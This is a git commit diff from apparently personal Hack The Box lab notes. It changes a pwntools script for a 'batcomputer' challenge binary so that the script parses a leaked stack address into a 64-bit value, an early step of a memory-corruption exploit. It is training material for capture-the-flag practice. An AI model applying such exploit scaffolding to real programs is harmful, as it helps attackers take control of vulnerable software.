4819ec993586f7e122110ba1a2807b60cdbd5328
Michel Klomp <michel@woodenshoe.org>
2021-02-14 17:45:55 +0100

    change number of bytes

--- labnotes/htb/scripts/ch-batcomputer.py
+++ labnotes/htb/scripts/ch-batcomputer.py
@@ -7,7 +7,8 @@ io = process('/home/kali/Downloads/batcomputer')
 io.sendlineafter('> ', '1')
 stack_address = io.recvline().strip().split()[-1]
 stack_address = ''.join([chr(int(stack_address[i: i+2], 16)) for i in range(2, len(stack_address), 2)])
-
+stack_address = stack_address.rjust(8, '\x00')
+stack_address = u64(stack_address)
 print(stack_address)
 
 io.interactive()
